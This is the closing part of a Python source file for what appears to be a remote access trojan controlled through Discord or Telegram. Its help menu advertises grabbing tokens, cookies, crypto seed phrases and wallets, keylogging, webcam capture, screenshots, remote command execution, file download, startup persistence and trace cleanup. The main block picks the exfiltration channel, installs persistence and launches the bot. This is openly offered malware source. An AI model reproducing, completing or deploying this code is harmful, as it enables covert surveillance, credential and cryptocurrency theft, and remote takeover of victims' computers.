        '.zip': '📦', '.rar': '📦', '.pdf': '📕', '.doc': '📘', '.docx': '📘',
        '.xls': '📊', '.xlsx': '📊', '.json': '📋', '.xml': '📋', '.html': '🌐',
        '.css': '🎨', '.js': '⚡', '.iso': '💿', '.msi': '📦', '.bat': '💻',
        '.cmd': '💻', '.ps1': '💻', '.reg': '📝', '.ini': '📝', '.cfg': '📝',
        '.conf': '📝', '.log': '📋', '.ttf': '🔤', '.otf': '🔤', '.apk': '📱',
        '.torrent': '🧲', '.lua': '📜'
    }
    return emoji_map.get(ext, '📄')

# ============================================================
# HELP COMMAND
# ============================================================

@bot.command(name='help')
@is_authorized()
async def help_cmd(ctx):
    embed = discord.Embed(
        title="📋 Commands",
        description=f"Prefix: `{Config.PREFIX}` | Delivery: `{Config.DELIVERY_METHOD}`",
        color=discord.Color.purple()
    )
    
    commands_list = [
        ("`grab`", "ULTIMATE GRAB - Everything (tokens, cookies, seed phrases, wallets)"),
        ("`info`", "System Information (HWID, CPU, GPU, RAM, IP, WiFi)"),
        ("`screenshot`", "Take screenshot"),
        ("`webcampic`", "Take webcam photo"),
        ("`keylogstart`", "Start keylogger"),
        ("`keylogstop`", "Stop keylogger"),
        ("`keylogdump`", "Dump keylogger logs"),
        ("`cmd <command>`", "Run CMD command"),
        ("`download <file>`", "Download a file"),
        ("`listfiles <dir>`", "List directory contents"),
        ("`lock`", "Lock PC"),
        ("`shutdown <delay>`", "Shutdown PC"),
        ("`restart <delay>`", "Restart PC"),
        ("`persistence`", "Add to startup"),
        ("`killswitch`", "Clean traces and exit")
    ]
    
    for cmd, desc in commands_list:
        embed.add_field(name=cmd, value=desc, inline=False)
    
    await ctx.send(embed=embed)

# ============================================================
# BOT RUN
# ============================================================

if __name__ == "__main__":
    # Show startup banner
    clear_screen()
    print(f"""
{Colors.YELLOW}╔═══════════════════════════════════════════════════════════════╗
{Colors.YELLOW}║{Colors.WHITE}              RAT CONTROLLER                          {Colors.YELLOW}║
{Colors.YELLOW}║{Colors.WHITE}         Discord / Telegram Remote Access             {Colors.YELLOW}║
{Colors.YELLOW}╚═══════════════════════════════════════════════════════════════╝
{Colors.RESET}
""")
    
    # Let user choose delivery method
    delivery_choice = select_delivery_method()
    
    # Map choice to config
    if delivery_choice == "discord":
        Config.DELIVERY_METHOD = "discord"
        print(f"{Colors.GREEN}[+]{Colors.WHITE} Delivery: Discord Only{Colors.RESET}")
    elif delivery_choice == "telegram":
        Config.DELIVERY_METHOD = "telegram"
        print(f"{Colors.GREEN}[+]{Colors.WHITE} Delivery: Telegram Only{Colors.RESET}")
    elif delivery_choice == "both":
        Config.DELIVERY_METHOD = "both"
        print(f"{Colors.GREEN}[+]{Colors.WHITE} Delivery: Discord + Telegram{Colors.RESET}")
    elif delivery_choice == "discord_backup":
        Config.DELIVERY_METHOD = "discord_backup"
        print(f"{Colors.GREEN}[+]{Colors.WHITE} Delivery: Discord (Telegram Backup){Colors.RESET}")
    elif delivery_choice == "telegram_backup":
        Config.DELIVERY_METHOD = "telegram_backup"
        print(f"{Colors.GREEN}[+]{Colors.WHITE} Delivery: Telegram (Discord Backup){Colors.RESET}")
    
    # Show config status
    print(f"""
{Colors.YELLOW}───────────────────────────────────────────────────────────────
{Colors.GREEN}[+] Discord Token: {Colors.CYAN}{'✓ Set' if Config.TOKEN and Config.TOKEN != "{placeholder_token}" else '✗ Not Set'}{Colors.RESET}
{Colors.GREEN}[+] Discord Whitelist: {Colors.CYAN}{'✓ Set' if Config.WHITELISTED and Config.WHITELISTED[0] != "{placeholder_whitelist}" else '✗ Not Set'}{Colors.RESET}
{Colors.GREEN}[+] Discord Channel: {Colors.CYAN}{'✓ Set' if Config.MAIN_CHANNEL and Config.MAIN_CHANNEL != "{placeholder_main_channel}" else '✗ Not Set'}{Colors.RESET}
{Colors.GREEN}[+] Telegram Bot: {Colors.CYAN}{'✓ Set' if Config.TELEGRAM_BOT_TOKEN else '✗ Not Set'}{Colors.RESET}
{Colors.GREEN}[+] Telegram Chat ID: {Colors.CYAN}{'✓ Set' if Config.TELEGRAM_CHAT_ID else '✗ Not Set'}{Colors.RESET}
{Colors.GREEN}[+] Delivery Method: {Colors.CYAN}{Config.DELIVERY_METHOD}{Colors.RESET}
{Colors.GREEN}[+] Startup: {Colors.CYAN}{Config.STARTUP}{Colors.RESET}
{Colors.YELLOW}───────────────────────────────────────────────────────────────
""")
    
    # Check for missing config
    if Config.DELIVERY_METHOD in ["discord", "both", "discord_backup"] and (not Config.TOKEN or Config.TOKEN == "{placeholder_token}"):
        print(f"{Colors.RED}[!] Discord token not set! Edit Config.TOKEN{Colors.RESET}")
    if Config.DELIVERY_METHOD in ["telegram", "both", "telegram_backup"] and not Config.TELEGRAM_BOT_TOKEN:
        print(f"{Colors.RED}[!] Telegram bot token not set! Edit Config.TELEGRAM_BOT_TOKEN{Colors.RESET}")
    
    time.sleep(2)
    
    # Add to startup if enabled
    if Config.STARTUP:
        add_to_startup()
    
    # Start the bot
    try:
        if Config.DELIVERY_METHOD in ["telegram", "both", "telegram_backup"] and Config.TELEGRAM_BOT_TOKEN:
            # Start Telegram bot in background (if implemented)
            pass
        bot.run(Config.TOKEN)
    except Exception as e:
        print(f"{Colors.RED}[!] Error: {e}{Colors.RESET}")
        input("Press Enter to exit...")
